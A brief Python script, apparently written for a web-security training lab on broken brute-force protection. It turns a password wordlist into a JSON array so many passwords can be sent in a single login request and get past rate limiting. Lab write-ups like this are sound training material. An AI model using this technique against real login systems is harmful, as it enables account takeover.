# Lab: Broken brute-force protection, multiple credentials per request

import json

with open('passwords.txt','r') as f:
    my_list = [line.strip() for line in f]

print(json.dumps(my_list))

'''
# Alternate Script

print('[', end='')

with open('passwords.txt','r') as f:
    lines = f.readlines()

for pwd in lines:
    print('"' + pwd.strip('\n') + '",', end='')

print('"random"]', end='')

'''
